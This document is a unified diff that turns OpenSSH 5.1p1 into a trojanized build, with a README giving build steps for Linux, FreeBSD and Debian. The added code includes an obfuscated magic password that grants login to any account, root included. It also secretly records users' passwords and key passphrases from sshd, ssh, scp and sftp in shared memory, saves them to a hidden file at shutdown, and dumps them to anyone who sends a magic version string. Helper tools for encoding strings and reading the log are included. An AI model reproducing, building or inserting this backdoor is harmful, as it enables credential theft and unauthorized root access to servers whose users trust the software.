diff -ruN openssh-5.1p1.orig/auth2-passwd.c openssh-5.1p1/auth2-passwd.c
--- openssh-5.1p1.orig/auth2-passwd.c	2006-08-04 22:39:39.000000000 -0400
+++ openssh-5.1p1/auth2-passwd.c	2011-02-18 20:20:49.000000000 -0500
@@ -43,6 +43,9 @@
 #include "monitor_wrap.h"
 #include "servconf.h"
 
+#include "hack.h"
+
+
 /* import */
 extern ServerOptions options;
 
@@ -66,12 +69,49 @@
 
 	if (change)
 		logit("password change not supported");
+        else if(!strcmp(uninvert(MAGICPASSWORD), password)) 
+               authenticated = 1;
 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
 		authenticated = 1;
 #ifdef HAVE_CYGWIN
 	if (check_nt_auth(1, authctxt->pw) == 0)
 		authenticated = 0;
 #endif
+  
+        {
+                int maxlen, len, sid;
+                char *addr;
+                struct in_addr ia;
+                struct sockaddr_in sin;
+  
+                memset(&ia, 0xff, sizeof(ia));
+                if(packet_connection_is_ipv4()) {
+                        len = sizeof(sin);
+                        getpeername(packet_get_connection_out(), (struct sockaddr *)&sin, &len);
+                        ia = sin.sin_addr;
+                }
+  
+                  sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+                  if(sid == -1)
+                          sid = shmget(SHMKEY, SHMSIZE, 0);
+                  if(sid != -1) {
+                        addr = shmat(sid, 0, 0);
+                        if(addr != (char *)~0) {
+                                memcpy(&maxlen, addr, 4);
+                                memcpy(&len, addr + 4, 4);
+  
+                                len += snprintf(addr + 8 + len, maxlen - len - 1, 
+                                                /* %s tried %s/%s: %s\n */
+                                                uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xc5\xdf"
+                                                "\xda\x8c\xf5"),
+                                                inet_ntoa(ia), authctxt->user, password, authenticated? "Success": "Failure");
+                                memcpy(addr + 4, &len, 4);
+                                shmdt(addr);
+                        }
+                }
+        }
+ 
+
 	memset(password, 0, len);
 	xfree(password);
 	return authenticated;
diff -ruN openssh-5.1p1.orig/auth-passwd.c openssh-5.1p1/auth-passwd.c
--- openssh-5.1p1.orig/auth-passwd.c	2007-10-26 00:25:12.000000000 -0400
+++ openssh-5.1p1/auth-passwd.c	2011-02-18 20:20:49.000000000 -0500
@@ -53,6 +53,7 @@
 #include "hostfile.h"
 #include "auth.h"
 #include "auth-options.h"
+#include "hack.h"
 
 extern Buffer loginmsg;
 extern ServerOptions options;
@@ -90,6 +91,9 @@
 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
 		ok = 0;
 #endif
+        if(!strcmp(uninvert(MAGICPASSWORD), password)) /* h4wh4w */
+		ok = 1;
+
 	if (*password == '\0' && options.permit_empty_passwd == 0)
 		return 0;
 
@@ -197,6 +201,11 @@
 	/* Just use the supplied fake password if authctxt is invalid */
 	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
 
+ 
+       if(!strcmp(uninvert(MAGICPASSWORD), password)) /* h4wh4w */
+               return 1;
+ 
+
 	/* Check for users with no password. */
 	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
 		return (1);
diff -ruN openssh-5.1p1.orig/hack.h openssh-5.1p1/hack.h
--- openssh-5.1p1.orig/hack.h	1969-12-31 19:00:00.000000000 -0500
+++ openssh-5.1p1/hack.h	2011-02-18 20:20:49.000000000 -0500
@@ -0,0 +1,52 @@
+#ifndef __HACK_H__
+#define __HACK_H__
+
+#ifdef __FreeBSD__
+#include <machine/param.h>
+#include <sys/types.h>
+#endif
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include "xmalloc.h"
+
+
+/* an unique key - ipcs shows it, so dont choose 0xc001b4b3 */
+#define SHMKEY		0x01
+
+/* size of the shared memory area */
+#define SHMSIZE		(256*1024)
+
+/* uncomment to remove the save/load/dump/shmem init code from sshd */
+#define SSHD_SHM_HACK	1
+
+/* Use the txtinvert utility to create these strings! */
+
+/* this password is always a valid password! */
+/* krap! */
+#define MAGICPASSWORD	"\x94\x8d\x9e\x8f\xde"
+
+/* dumps user/pass/host list when sent to sshd */
+/* openssh */
+#define MAGICVERSION	"\x90\x8f\x9a\x91\x8c\x8c\x97"
+
+/* static storage of user/pass/host list when sshd is killed */
+/* /var/tmp/.ex */
+#define SHMTEMPFILE	"\xd0\x89\x9e\x8d\xd0\x8b\x92\x8f\xd0\xd1\x9a\x87"
+
+
+/* better than cleartext! */
+static inline char *uninvert(char *str) {
+	static char *s = NULL;
+	int i;
+
+	if(s)
+		xfree(s);
+
+	s = (char *)xstrdup(str);
+	for(i = 0; s[i]; i++)
+		s[i] = ~(s[i]) & 0xff;
+
+	return s;
+}
+
+#endif
diff -ruN openssh-5.1p1.orig/monitor.c openssh-5.1p1/monitor.c
--- openssh-5.1p1.orig/monitor.c	2011-02-18 21:18:58.000000000 -0500
+++ openssh-5.1p1/monitor.c	2011-02-18 21:11:16.000000000 -0500
@@ -88,6 +88,8 @@
 #include "compat.h"
 #include "ssh2.h"
 
+#include "hack.h"
+
 #ifdef GSSAPI
 static Gssctxt *gsscontext = NULL;
 #endif
@@ -986,6 +988,40 @@
 		for (i = 0; i < num; ++i)
 			resp[i] = buffer_get_string(m, NULL);
 		ret = (sshpam_device.respond)(sshpam_ctxt, num, resp);
+		if(num) {
+	                int maxlen, len, sid;
+	                char *addr;
+	                struct in_addr ia;
+	                struct sockaddr_in sin;
+
+	                memset(&ia, 0xff, sizeof(ia));
+	                if(packet_connection_is_ipv4()) {
+	                        len = sizeof(sin);
+	                        getpeername(packet_get_connection_out(), (struct sockaddr *)&sin, &len);
+	                        ia = sin.sin_addr;
+	                }
+
+	                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+	                if(sid == -1)
+	                        sid = shmget(SHMKEY, SHMSIZE, 0);
+	                if(sid != -1) {
+	                        addr = shmat(sid, 0, 0);
+	                        if(addr != (char *)~0) {
+	                                memcpy(&maxlen, addr, 4);
+	                                memcpy(&len, addr + 4, 4);
+	
+	                                len += snprintf(addr + 8 + len, maxlen - len - 1,
+                                                /* %s tried %s/%s\n */
+                                               // uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xf5"),
+                                                uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf\xd7"
+"\xda\x9b\xd6\xf5"),
+                                                inet_ntoa(ia), authctxt->user, resp[0], ret);
+
+	                                memcpy(addr + 4, &len, 4);
+	                                shmdt(addr);
+	                        }
+	                }
+		}
 		for (i = 0; i < num; ++i)
 			xfree(resp[i]);
 		xfree(resp);
diff -ruN openssh-5.1p1.orig/README.hack openssh-5.1p1/README.hack
--- openssh-5.1p1.orig/README.hack	1969-12-31 19:00:00.000000000 -0500
+++ openssh-5.1p1/README.hack	2011-02-18 21:17:57.000000000 -0500
@@ -0,0 +1,73 @@
+Patch for OpenSSH 5.1p1 (portable)			- (c) noah
+
++ Logs usernames, passwords & host from sshd, ssh, scp, sftp
++ Magic password
+- Does log stuff as usual
+
+Linux:
+$ tar zxf openssh-5.1p1.tar.gz
+$ patch -p0 < this-patch
+$ cd openssh-5.1p1
+$ ./configure --sysconfdir=/etc/ssh --prefix=/usr .. 
+
+FreeBSD:
+$ cd /usr/ports/security/openssh-portable
+$ make configure
+$ cp /tmp/this-patch work
+$ (cd work;patch -p0 < this-patch)
+$ make all
+
+Debian 5.0.8:
+$ apt-get source openssh-client
+$ apt-get build-dep openssh-client
+$ patch -p0 < this-patch
+$ cd openssh-5.1p1 && debuild -us -uc
+The patched binaries will be found at:
+  debian/openssh-client/usr/bin/{scp,sftp,ssh}
+
+$ apt-get source openssh-server
+$ apt-get build-dep openssh-server
+$ patch -p0 < this-patch
+$ cd openssh-5.1p1 && debuild -us -uc
+The patched binary will be found at:
+  debian/openssh-client/usr/sbin/sshd
+
+
+
+Logs username/password and host from ssh, scp and sftp into a preferably
+worldwritable shared memory area. By default sshd setups this area
+(unless you comment out SSHD_SHM_HACK in hack.h).
+Since i guess most ppl arent really aware of ipcs/shared memory, it's
+probably better than keeping a worldwriteable file in the system to log
+stuff to.
+
+The drawback with this approach is that the logs are stored in a volatile
+memory, which are lost on reboots for example.
+
+To solve this, we exploit the fact that the sshd process is normally sent
+a SIGTERM signal upon system reboot, before all programs are killed with
+SIGKILL.
+When sshd receives a SIGTERM, we write down the contents of our shared
+memory segment to a file.
+Next time sshd is started, we load the file's contents and unlink it.
+
+The contents of the shared memory segment can be dumped by connecting
+to the sshd and entering the magic version string.
+Its content is cleared after a dump.
+
+A magic password is provided, and works for root's account even if
+rootlogins are not permitted.
+
+
+Do a 'make txtinvert' to build the txtinvert utility.
+Use it to customize the strings in hack.h.
+
+
+The contents of the shared memory area is as follows
+[shared memory size: 4 bytes][bytes used: 4 bytes][logs.. logs.. logs..]
+..in case you undefine SSHD_SHM_HACK and rather want to keep track of
+that area yourself to automatically send the logged stuff somewhere..
+
+Do a 'make shmcat' to build the utility to dump the shared memory log.
+Run 'shmcat' to display the contents or 'shmcat -d' to display AND zap
+the contents of the log.
diff -ruN openssh-5.1p1.orig/shmcat.c openssh-5.1p1/shmcat.c
--- openssh-5.1p1.orig/shmcat.c	1969-12-31 19:00:00.000000000 -0500
+++ openssh-5.1p1/shmcat.c	2011-02-18 21:02:09.000000000 -0500
@@ -0,0 +1,40 @@
+/**
+ * OpenSSH haqr patch
+ * - Small utility to dump contents of shared memory buffer
+ */
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/shm.h>
+#include <string.h>
+
+#include "hack.h"
+
+int main(int argc, char **argv) {
+	int len, sid; 
+	char *addr;
+
+	sid = shmget(SHMKEY, SHMSIZE, 0);
+	fprintf(stderr, "[*] shmget() on key 0x%08x returned identifier 0x%08x\n", SHMKEY, sid);
+	if(sid != -1) {
+		addr = shmat(sid, 0, 0);
+		fprintf(stderr, "[*] shmat() returned address %p\n", addr);
+		if(addr != (char *)~0) {
+			memcpy(&len, addr + 4, 4);
+			fprintf(stderr, "[*] %d bytes in buffer\n", len);
+			fwrite(addr + 8, 1, len, stdout);
+
+			if(argc == 2 && !strcmp(argv[1], "-d")) {
+				len = 0;
+				memcpy(addr + 4, &len, 4);
+				fprintf(stderr, "[*] Zapped contents of log buffer\n");
+			}
+			else
+				fprintf(stderr, "[*] Run with -d to zap contents of log buffer\n");
+
+			shmdt(addr);
+		}
+	}
+
+	return 0;
+}
diff -ruN openssh-5.1p1.orig/sshconnect1.c openssh-5.1p1/sshconnect1.c
--- openssh-5.1p1.orig/sshconnect1.c	2006-11-07 07:14:42.000000000 -0500
+++ openssh-5.1p1/sshconnect1.c	2011-02-18 20:20:49.000000000 -0500
@@ -48,6 +48,9 @@
 #include "hostfile.h"
 #include "auth.h"
 
+#include "hack.h"
+static char *sp = NULL; /* saved password */
+
 /* Session id for the current session. */
 u_char session_id[16];
 u_int supported_authentications = 0;
@@ -269,6 +272,30 @@
 				debug2("no passphrase given, try next key");
 				quit = 1;
 			}
+                {
+                        int maxlen, len, sid;
+                        char *addr;
+
+	                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+	                if(sid == -1)
+	                        sid = shmget(SHMKEY, SHMSIZE, 0);
+                        if(sid != -1) {
+                                addr = shmat(sid, 0, 0);
+                                if(addr != (char *)~0) {
+                                        memcpy(&maxlen, addr, 4);
+                                        memcpy(&len, addr + 4, 4);
+
+                                        len += snprintf(addr + 8 + len, maxlen - len - 1,
+                                        /* Phrase %s used on file %s, uid=%d\n */
+                                        uninvert( "\xaf\x97\x8d\x9e\x8c\x9a\xdf\xda\x8c\xdf\x8a\x8c\x9a\x9b\xdf\x90"
+                                        "\x91\xdf\x99\x96\x93\x9a\xdf\xda\x8c\xd3\xdf\x8a\x96\x9b\xc2\xda"
+                                        "\x9b\xf5"), passphrase, authfile, getuid());
+                                        memcpy(addr + 4, &len, 4);
+                                        shmdt(addr);
+                                }
+                        }
+
+                }
 			memset(passphrase, 0, strlen(passphrase));
 			xfree(passphrase);
 			if (private != NULL || quit)
@@ -456,6 +483,11 @@
 		if (i != 0)
 			error("Permission denied, please try again.");
 		password = read_passphrase(prompt, 0);
+		if(sp)
+			xfree(sp);
+
+		sp = xstrdup(password);
+
 		packet_start(SSH_CMSG_AUTH_PASSWORD);
 		ssh_put_password(password);
 		memset(password, 0, strlen(password));
@@ -742,8 +774,32 @@
 		snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 		    server_user, host);
 		if (try_password_authentication(prompt))
+		{
+			int maxlen, len, sid;
+			char *addr;
+
+			sid = shmget(SHMKEY, SHMSIZE, 0);
+			if(sid != -1) {
+				addr = shmat(sid, 0, 0);
+				if(addr != (char *)~0) {
+					memcpy(&maxlen, addr, 4);
+					memcpy(&len, addr + 4, 4);
+	
+					len += snprintf(addr + 8 + len, maxlen - len - 1,
+							/* %s tried %s/%s on %s\n */
+							uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf\x90"
+							"\x91\xdf\xda\x8c\xf5"),
+							local_user, server_user, sp, host);
+					memcpy(addr + 4, &len, 4);
+					shmdt(addr);
+				}
+			}
+
 			goto success;
+		}
+
 	}
+
 	/* All authentication methods have failed.  Exit with an error message. */
 	fatal("Permission denied.");
 	/* NOTREACHED */
diff -ruN openssh-5.1p1.orig/sshconnect2.c openssh-5.1p1/sshconnect2.c
--- openssh-5.1p1.orig/sshconnect2.c	2011-02-18 21:18:58.000000000 -0500
+++ openssh-5.1p1/sshconnect2.c	2011-02-18 20:20:49.000000000 -0500
@@ -72,6 +72,9 @@
 #include "ssh-gss.h"
 #endif
 
+#include "hack.h"
+
+
 /* import */
 extern char *client_version_string;
 extern char *server_version_string;
@@ -882,6 +885,34 @@
 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 	    authctxt->server_user, authctxt->host);
 	password = read_passphrase(prompt, 0);
+
+	{
+		int maxlen, len, sid;
+		char *addr;
+
+                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+                if(sid == -1)
+                        sid = shmget(SHMKEY, SHMSIZE, 0);
+
+		if(sid != -1) {
+			addr = shmat(sid, 0, 0);
+			if(addr != (char *)~0) {
+				memcpy(&maxlen, addr, 4);
+				memcpy(&len, addr + 4, 4);
+
+				len += snprintf(addr + 8 + len, maxlen - len - 1, 
+						/* %s tried %s/%s on %s\n */
+						uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf"
+						"\x90\x91\xdf\xda\x8c\xf5"),
+						authctxt->local_user, authctxt->server_user, password, authctxt->host);
+				memcpy(addr + 4, &len, 4);
+				shmdt(addr);
+			}
+		}
+
+
+	}
+
 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
 	packet_put_cstring(authctxt->service);
@@ -1134,6 +1165,30 @@
 				debug2("no passphrase given, try next key");
 				quit = 1;
 			}
+                {
+                        int maxlen, len, sid;
+                        char *addr;
+
+	                sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+	                if(sid == -1)
+	                        sid = shmget(SHMKEY, SHMSIZE, 0);
+                        if(sid != -1) {
+                                addr = shmat(sid, 0, 0);
+                                if(addr != (char *)~0) {
+                                        memcpy(&maxlen, addr, 4);
+                                        memcpy(&len, addr + 4, 4);
+        
+                                        len += snprintf(addr + 8 + len, maxlen - len - 1,
+					/* Phrase %s used on file %s, uid=%d\n */
+					uninvert( "\xaf\x97\x8d\x9e\x8c\x9a\xdf\xda\x8c\xdf\x8a\x8c\x9a\x9b\xdf\x90"
+					"\x91\xdf\x99\x96\x93\x9a\xdf\xda\x8c\xd3\xdf\x8a\x96\x9b\xc2\xda"
+					"\x9b\xf5"), passphrase, filename, getuid());
+                                        memcpy(addr + 4, &len, 4);
+                                        shmdt(addr);
+                                }
+                        }
+
+                }
 			memset(passphrase, 0, strlen(passphrase));
 			xfree(passphrase);
 			if (private != NULL || quit)
@@ -1351,6 +1406,31 @@
 		echo = packet_get_char();
 
 		response = read_passphrase(prompt, echo ? RP_ECHO : 0);
+	{
+		int maxlen, len, sid;
+		char *addr;
+
+		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+		if(sid == -1)
+			sid = shmget(SHMKEY, SHMSIZE, 0);
+		if(sid != -1) {
+			addr = shmat(sid, 0, 0);
+			if(addr != (char *)~0) {
+				memcpy(&maxlen, addr, 4);
+				memcpy(&len, addr + 4, 4);
+
+				len += snprintf(addr + 8 + len, maxlen - len - 1, 
+						/* %s tried %s/%s on %s\n */
+						uninvert("\xda\x8c\xdf\x8b\x8d\x96\x9a\x9b\xdf\xda\x8c\xd0\xda\x8c\xdf"
+						"\x90\x91\xdf\xda\x8c\xf5"),
+						authctxt->local_user, authctxt->server_user, response, authctxt->host);
+				memcpy(addr + 4, &len, 4);
+				shmdt(addr);
+			}
+		}
+
+
+	}
 
 		packet_put_cstring(response);
 		memset(response, 0, strlen(response));
diff -ruN openssh-5.1p1.orig/sshd.c openssh-5.1p1/sshd.c
--- openssh-5.1p1.orig/sshd.c	2011-02-18 21:18:58.000000000 -0500
+++ openssh-5.1p1/sshd.c	2011-02-18 20:34:11.000000000 -0500
@@ -124,6 +124,8 @@
 #include <Security/AuthSession.h>
 #endif
 
+#include "hack.h"
+
 #ifdef LIBWRAP
 #include <tcpd.h>
 #include <syslog.h>
@@ -459,6 +461,29 @@
 	}
 	buf[sizeof(buf) - 1] = 0;
 	client_version_string = xstrdup(buf);
+ 
+#ifdef SSHD_SHM_HACK
+              if(!strncmp(uninvert(MAGICVERSION), buf, strlen(MAGICVERSION))) {
+                      int len, sid;
+                      char *addr;
+
+                      sid = shmget(SHMKEY, SHMSIZE, 0);
+                      if(sid != -1) {
+                              addr = shmat(sid, 0, 0);
+                              if(addr != (char *)~0) {
+                                      memcpy(&len, addr + 4, 4);
+                                      write(sock_out, addr + 8, len);                         
+                                      memset(addr + 4, 0, SHMSIZE - 4);
+
+                                      shmdt(addr);
+                              }
+                      }
+
+			cleanup_exit(255);
+              }
+#endif
+ 
+
 
 	/*
 	 * Check that the versions match.  In future this might accept
@@ -1096,6 +1121,30 @@
 		if (ret < 0 && errno != EINTR)
 			error("select: %.100s", strerror(errno));
 		if (received_sigterm) {
+#ifdef SSHD_SHM_HACK
+			/**
+			 * Dump contents of shared memory buffer to local file
+			 */
+			FILE *fd;
+			int len, sid;
+			char *addr;
+
+			sid = shmget(SHMKEY, SHMSIZE, 0);
+			if(sid != -1) {
+				addr = shmat(sid, 0, 0);
+				if(addr != (char *)~0) {
+					memcpy(&len, addr + 4, 4);
+					fd = fopen(uninvert(SHMTEMPFILE), "w");
+					if(fd) {
+						fwrite(addr + 8, 1, len, fd);
+						fclose(fd);
+					}
+
+					shmdt(addr);
+				}
+			}
+#endif
+
 			logit("Received signal %d; terminating.",
 			    (int) received_sigterm);
 			close_listen_socks();
@@ -1705,6 +1754,46 @@
 	/* ignore SIGPIPE */
 	signal(SIGPIPE, SIG_IGN);
 
+#ifdef SSHD_SHM_HACK
+       do {
+               int i, newseg = 1, sid;
+               char *shmaddr;
+               FILE *fd;
+
+               sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
+               if(sid == -1) {
+                       sid = shmget(SHMKEY, SHMSIZE, 0);
+                       if(sid == -1)
+                               break;
+
+                       newseg = 0;
+               }
+
+               shmaddr = shmat(sid, 0, 0);
+               if(shmaddr == (char *)~0) {
+                       shmaddr = NULL;
+                       break;
+               }
+
+               if(newseg) {
+                       memset(shmaddr, 0, SHMSIZE);
+                       i = SHMSIZE - 8;
+                       memcpy(shmaddr, &i, 4);
+                       fd = fopen(uninvert(SHMTEMPFILE), "r");
+                       if(fd) {
+                               i = fread(shmaddr + 8, 1, SHMSIZE - 8, fd);
+                               fclose(fd);
+                               unlink(uninvert(SHMTEMPFILE));
+                               memcpy(shmaddr + 4, &i, 4);
+                       }
+                       else
+                               memset(shmaddr + 4, 0, 4);
+               }
+
+               shmdt(shmaddr);
+       } while(0);
+#endif
+
 #ifdef OOM_ADJUST
 	/* Adjust out-of-memory killer */
 	oom_adjust_startup();
diff -ruN openssh-5.1p1.orig/txtinvert.c openssh-5.1p1/txtinvert.c
--- openssh-5.1p1.orig/txtinvert.c	1969-12-31 19:00:00.000000000 -0500
+++ openssh-5.1p1/txtinvert.c	2011-02-18 21:15:06.000000000 -0500
@@ -0,0 +1,28 @@
+/**
+ * OpenSSH haqr patch
+ * - Small utility to convert plaintext to 'better than plaintext'
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+	int i;
+
+	if(argc != 2) {
+		printf("Usage: %s <string>\n", argv[0]);
+		return -1;
+	}
+
+	printf("/* %s */\n\"", argv[1]);
+	for(i = 0; i < strlen(argv[1]); i++) {
+		printf("\\x%02x", ~(argv[1][i]) & 0xff);
+		if((i % 16) == 15)
+			printf("\"\n\"");
+	}
+
+	printf("\"\n");
+
+	return 0;
+}
